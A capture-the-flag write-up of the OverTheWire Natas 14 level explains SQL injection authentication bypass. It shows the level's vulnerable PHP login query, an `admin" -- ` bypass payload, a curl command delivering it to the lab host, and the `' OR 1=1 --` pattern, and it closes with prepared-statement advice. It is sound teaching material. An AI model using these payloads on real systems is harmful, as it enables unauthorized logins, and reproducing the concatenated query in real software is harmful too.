# Write-up: Natas 14 → 15  
**Date:** 2025-12-14  

## Obfuscated password (ROT13)  
`?`

---

## OBJECTIVE

>The level demonstrates basic **authentication bypass** using SQL injection. By exploiting the way SQL queries are built from user input, we can skip password verification and log in as the `admin` user (or any user). This challenge is a textbook case of:
>
>- Poor input sanitization
>- Vulnerable string interpolation in SQL
>- Classic `' OR 1=1 --` injection
>Clicking “View sourcecode” reveals:
```php
if(array_key_exists("username", $_REQUEST)) {
    $link = mysqli_connect("localhost", "natas14", "<password>");
    mysqli_select_db($link, "natas14");

    $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\" and password=\"".$_REQUEST["password"]."\"";

    if($res = mysqli_query($link, $query)) {
        if(mysqli_num_rows($res) > 0) {
            echo "Successful login! The password for natas15 is <censored>";
        } else {
            echo "Access denied!";
        }
    } else {
        echo "Query failed";
    }
}
```

---

## PURPOSE

The query is built unsafely:

```sql
SELECT * FROM users WHERE username="USERNAME" AND password="PASSWORD"
```

Since user input is inserted **directly** into the query, you can break out of the string context and inject your own SQL logic. We’ll bypass the password check by injecting something like:

```
username = admin" -- 
password = anything
```

Resulting SQL:

```sql
SELECT * FROM users WHERE username="admin" -- " AND password="..."
```

Everything after `--` is ignored, so the query becomes:

```sql
SELECT * FROM users WHERE username="admin"
```

---

## SOLUTION

**Manual (browser):**

1. Open the login form.
2. Enter:
   - Username: `admin" -- `
   - Password: `anything`
3. Submit.

You’ll see:

```
Successful login! The password for natas15 is <password>
```

**cURL:**

```bash
curl -s -u natas14:<password> \
  --data "username=admin\" -- &password=irrelevant" \
  http://natas14.natas.labs.overthewire.org/
```

---

## TAKEAWAYS

- **SQL injection** happens when user input is inserted unsafely into SQL queries.
- The classic `' OR 1=1 --` works because it breaks out of the string and appends a tautology.
- The correct way to prevent this is:
  - Always use **prepared statements**
  - Never trust raw user input
  - Escape user input properly
- This level is a practical intro to authentication bypass via SQLi.

---

Writeup author: **Jeremy Ray Jewell**  
[GitHub](https://github.com/jeremyrayjewell)  
[LinkedIn](https://www.linkedin.com/in/jeremyrayjewell)
